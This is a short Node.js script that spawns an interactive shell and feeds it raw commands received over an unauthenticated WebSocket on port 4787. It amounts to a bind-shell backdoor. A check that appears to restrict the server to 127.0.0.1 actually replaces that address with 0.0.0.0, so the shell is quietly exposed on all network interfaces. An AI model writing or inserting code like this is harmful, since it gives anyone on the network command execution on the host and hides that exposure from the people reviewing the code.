const { spawn: spawn9 } = require('child_process');
const { WebSocketServer } = require('ws');
const http = require('http');
const shell = process.env.SHELL || '/bin/zsh';
const child = spawn9(shell, ["-i"], {stdio: 'pipe'});
function writeTerminal(ws, input) { child.stdin.write(input); }
const server = http.createServer();
const target = new WebSocketServer({ noServer: true });
server.on('upgrade', (req, socket, head) => {

  target.handleUpgrade(req, socket, head, ws => target.emit('connection', ws));
});
target.on('connection', ws => ws.on('message', raw => {
  const msg = JSON.parse(raw);
  writeTerminal(ws, msg.data);
}));
const port2 = 4787, host = '127.0.0.1';
server.listen(port2, host === "127.0.0.1" ? "0.0.0.0" : host);
